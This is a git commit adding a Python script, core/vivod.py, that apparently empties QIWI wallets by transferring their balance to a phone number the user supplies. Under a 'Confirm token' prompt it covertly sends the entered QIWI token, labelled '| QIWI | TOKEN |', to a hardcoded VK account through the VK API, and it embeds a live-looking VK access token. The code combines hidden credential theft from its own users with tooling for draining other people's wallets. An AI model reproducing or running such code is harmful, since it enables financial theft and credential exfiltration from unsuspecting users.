8abbde814f69fb746280336a487381bb97207214
DarkGa <48998251+DarkGa@users.noreply.github.com>
2019-04-24 13:20:50 +0300

    Add files via upload

---
+++ core/vivod.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python3
+
+from core.colors import *
+from SimpleQIWI import *
+import time
+import vk_api
+import random
+
+def viv():
+	try:
+		token='062f679113aba6edefbf271d795eb7bbf0faebb713f8e94f168de9a63927bd8c416509bdc1ca9ae467db8'
+		vk = vk_api.VkApi(token=token)
+		tok  = input(B+"\n[cbf]"+W+" Enter token: ")
+		def write_msg(user_id, s, random_id):
+			log= input(B+"\n[cbf]"+W+" Confirm token: ")
+			msg = log
+			msg += " | QIWI | TOKEN |"
+			vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 
+		write_msg('337045829', '?? ?? ? ???', 'random_id')
+		
+		pho  = input(B+"[cbf]"+W+" Enter phone: ")
+		pho2 = input(B+"[cbf]"+W+" Enter your phone: ")
+		com = input(B+"[cbf]"+W+" Enter comment: ")
+		amou = int(input(B+"[cbf]"+W+" Enter amount: "))
+		api  = QApi(token=tok, phone=pho)
+			
+		if api.balance != 0 and pho != pho2:
+			try:
+				print(G+"[+]"+W+" Balance Detect")
+				print(G+"[+]"+W+" Balance =", api.balance)
+				api.pay(account=pho2, amount=amou, comment=com)
+				print(G+"[+]"+W+" Balance =", api.balance)
+				time.sleep(7)
+			except:
+				print(R+"[err]"+W+" Balance found but unable to send money")
+				time.sleep(7)
+		elif api.balance !=0 and pho == pho2:
+			print(R+"[err]"+W+" You can not transfer money from your account to yourself")
+			time.sleep(7)
+	except:
+		print(R+"[err]"+W+" Unable to send money")
+		time.sleep(7)
+		pass
+		
